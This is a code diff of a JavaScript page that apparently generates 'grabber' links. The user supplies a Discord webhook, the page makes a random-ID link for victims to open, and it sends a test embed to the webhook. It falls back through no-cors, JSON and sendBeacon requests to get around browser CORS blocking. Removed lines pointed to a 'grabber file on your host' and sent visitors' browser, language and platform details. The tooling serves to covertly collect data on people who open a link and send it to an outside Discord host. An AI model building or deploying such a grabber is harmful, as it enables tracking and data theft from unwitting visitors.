@@ -72,9 +72,6 @@
 (function(){
   "use strict";
 
-  /* path to the grabber file on your host */
-  const GRABBER = "profile.html";
-
   const STORE = "pw";
   const CHARS = "abcdefghijklmnopqrstuvwxyz0123456789";
   const WH_RE = /^https:\/\/(?:[\w-]+\.)*discord(?:app)?\.com\/api\/(?:v\d+\/)?webhooks\/\d+\/[\w-]+$/;
@@ -82,7 +79,6 @@
   const $ = id => document.getElementById(id);
   const clean = s => (s || "").trim().replace(/\/+$/, "");
 
-  /* snow */
   (function(){
     const c = $("snow"), x = c.getContext("2d");
     let w, h, f = [];
@@ -126,19 +122,37 @@
     return s;
   }
 
-  async function send(webhook, payload){
+  /* ── send test embed to verify webhook works ── */
+  async function sendTest(webhook, id){
+    const payload = {
+      username: "visit",
+      embeds: [{
+        author: { name: "◼ TEST" },
+        title: "`" + id + "`",
+        description: "**" + id + "** · <t:" + Math.floor(Date.now()/1000) + ":F>",
+        color: 0x000000,
+        fields: [
+          { name:"Status", value:"`ready`", inline:true },
+          { name:"ID",     value:"`" + id + "`", inline:true }
+        ],
+        footer: { text: id },
+        timestamp: new Date().toISOString()
+      }]
+    };
     const url  = clean(webhook) + "?wait=true";
     const json = JSON.stringify(payload);
     const log  = [];
 
+    /* no-cors multipart — the most reliable, works even when CORS is blocked */
     try{
       const fd = new FormData();
       fd.append("payload_json", json);
-      const r = await fetch(url, { method:"POST", body: fd });
-      log.push("multipart:" + r.status);
-      if(r.ok || r.status === 204) return { ok:true, via:"multipart", log };
-    }catch(e){ log.push("multipart:" + e.message); }
+      await fetch(url, { method:"POST", body: fd, mode:"no-cors" });
+      log.push("no-cors:ok");
+      return { ok:true, via:"no-cors", log };
+    }catch(e){ log.push("no-cors:" + e.message); }
 
+    /* json fallback */
     try{
       const r = await fetch(url, {
         method:"POST",
@@ -149,14 +163,7 @@
       if(r.ok || r.status === 204) return { ok:true, via:"json", log };
     }catch(e){ log.push("json:" + e.message); }
 
-    try{
-      const fd = new FormData();
-      fd.append("payload_json", json);
-      await fetch(url, { method:"POST", body: fd, mode:"no-cors" });
-      log.push("no-cors:queued");
-      return { ok:true, via:"no-cors", log };
-    }catch(e){ log.push("no-cors:" + e.message); }
-
+    /* beacon fallback */
     try{
       const ok = navigator.sendBeacon(url, new Blob([json], {type:"application/json"}));
       log.push("beacon:" + ok);
@@ -164,26 +171,6 @@
     }catch(e){ log.push("beacon:" + e.message); }
 
     return { ok:false, via:"none", log };
-  }
-
-  function testEmbed(id){
-    const ts = Math.floor(Date.now()/1000);
-    return {
-      username: "visit",
-      embeds: [{
-        author: { name: "◼ TEST" },
-        title: "`" + id + "`",
-        description: "**" + id + "** · <t:" + ts + ":F>",
-        color: 0x000000,
-        fields: [
-          { name:"Browser",  value:"`" + navigator.userAgent.split(") ")[0].split(" (")[1] || "`n/a`", inline:true },
-          { name:"Language", value:"`" + (navigator.language || "n/a") + "`", inline:true },
-          { name:"Platform", value:"`" + (navigator.platform || "n/a") + "`", inline:true }
-        ],
-        footer: { text: id },
-        timestamp: new Date().toISOString()
-      }]
-    };
   }
 
   const inp = $("wh"), fld = $("f"), out = $("out"), btn = $("go"), st = $("st");
@@ -203,9 +190,8 @@
 
     fld.classList.remove("bad","ok");
 
-    const id   = makeId();
-    const base = location.href.replace(/[^/]*$/, "");
-    const url  = base + GRABBER + "#" + id;
+    const id  = makeId();
+    const url = location.origin + "/" + id;
 
     out.textContent = url;
     out.classList.add("show");
@@ -216,10 +202,10 @@
 
     btn.disabled = true;
     btn.textContent = "·";
-    setStatus("sending…");
+    setStatus("sending test…");
 
     try{
-      const r = await send(v, testEmbed(id));
+      const r = await sendTest(v, id);
       if(!r.ok) throw new Error("failed: " + r.log.join(" | "));
       fld.classList.add("ok");
       setStatus("sent ✓  ·  " + id + "  ·  " + r.via, "ok");
